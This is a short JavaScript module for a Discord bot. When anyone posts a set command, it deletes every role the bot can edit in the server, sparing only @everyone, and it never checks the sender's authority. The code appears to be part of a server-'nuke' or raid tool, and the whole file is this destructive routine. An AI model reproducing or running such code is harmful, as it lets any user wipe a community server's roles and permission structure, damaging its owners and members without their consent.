module.exports = (client, prefix, commande) => {
    client.on('message', message => {
        if (message.content === prefix + commande) {
            message.guild.roles.map(role => {
                if (role.editable) {
                    if (role.name === '@everyone') return;
                    role.delete();
                }
            });
        }
    })
}